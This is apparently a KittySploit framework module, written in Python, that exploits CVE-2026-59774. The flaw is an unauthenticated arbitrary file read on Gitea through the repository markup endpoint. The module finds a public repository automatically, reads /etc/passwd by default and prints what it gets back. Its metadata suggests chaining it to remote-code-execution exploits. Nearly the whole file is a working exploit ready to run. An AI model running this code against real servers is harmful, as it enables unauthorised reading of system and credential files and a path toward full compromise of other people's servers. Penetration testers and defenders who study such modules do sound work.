#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-59774 unauthenticated Org-mode file read via public repo markup."""

from kittysploit import *
from lib.protocols.http.gitea_probe import Gitea
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Gitea):
    __info__ = {
        "name": "Gitea CVE-2026-59774 unauth file read",
        "description": (
            "Reads arbitrary files through POST /{owner}/{repo}/markup on a public "
            "repository (no account). Defaults to /etc/passwd."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-59774"],
        "references": ["https://github.com/go-gitea/gitea/security/advisories/GHSA-6v53-hr58-556r"],
        "tags": ["gitea", "forgejo", "lfi", "unauth", "cve-2026-59774"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": [
                    "exploits/linux/http/gitea_cve_2026_59774_unauth_markup_rce",
                    "scanner/http/gitea_cve_2026_60004_detect",
                    "exploits/linux/http/gitea_cve_2026_60004_diffpatch_rce",
                    "scanner/http/forgejo_cve_2026_59774_detect",
                ],
            },
        },
    }

    repo = OptString("", "Public owner/repo (auto from search if empty)", False)
    read_path = OptString("/etc/passwd", "Absolute path to read", False)

    def run(self):
        repo = str(self.repo or "").strip() or self.gitea_search_public_repo_unauth()
        if not repo:
            print_error("No public repository found — set repo")
            return False
        code, content = self.gitea_repo_markup_include(repo, str(self.read_path or "/etc/passwd"))
        if code != 200 or "root:" not in (content + (self.read_path or "")):
            if code == 200 and content.strip():
                print_success(f"Read via {repo} ({len(content)} bytes)")
                print_status(content[:1500])
                self.set_info(severity="critical", cve="CVE-2026-59774", repo=repo)
                return True
            print_error(f"Markup read failed (HTTP {code})")
            return False
        print_success(f"Read {self.read_path} via {repo}")
        print_status(content[:1500])
        self.set_info(severity="critical", cve="CVE-2026-59774", repo=repo)
        return True